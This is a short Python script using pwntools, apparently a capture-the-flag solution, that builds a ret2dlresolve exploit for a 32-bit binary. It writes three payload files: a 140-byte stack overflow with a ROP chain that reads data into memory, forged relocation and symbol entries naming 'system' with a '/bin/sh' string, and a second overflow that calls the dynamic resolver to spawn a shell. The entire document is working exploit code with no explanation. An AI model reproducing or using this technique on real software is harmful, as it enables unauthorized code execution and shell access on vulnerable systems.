from pwn import *
context.arch = 'i386'
JMPREL = 0x80482e8; SYMTAB = 0x80481cc; STRTAB = 0x804824c
DATA = 0x804a800; SYM = DATA + 0xc; STR = DATA + 0x1c; BINSH = DATA + 0x40; ROFF = DATA + 0x80
sym_idx = (SYM - SYMTAB) // 16
st_name = STR - STRTAB
print("sym_idx", hex(sym_idx), "st_name", hex(st_name), "reloc_arg", hex(DATA - JMPREL))
d = p32(ROFF) + p32((sym_idx << 8) | 7) + b"\x00" * 4
d += p32(st_name) + p32(0) + p32(0) + p8(0x12) + p8(0) + p16(0)
d += b"system\x00" + b"\x00" * (0x40 - 0x1c) + b"/bin/sh\x00"
c1 = b"A" * 140 + p32(0x8048360) + p32(0x8048474) + p32(0) + p32(DATA) + p32(0x100)
c2 = d
c3 = b"A" * 140 + p32(0x8048350) + p32(DATA - JMPREL) + p32(0) + p32(BINSH)
open("/tmp/c1", "wb").write(c1)
open("/tmp/c2", "wb").write(c2)
open("/tmp/c3", "wb").write(c3)
print("len", len(c2))
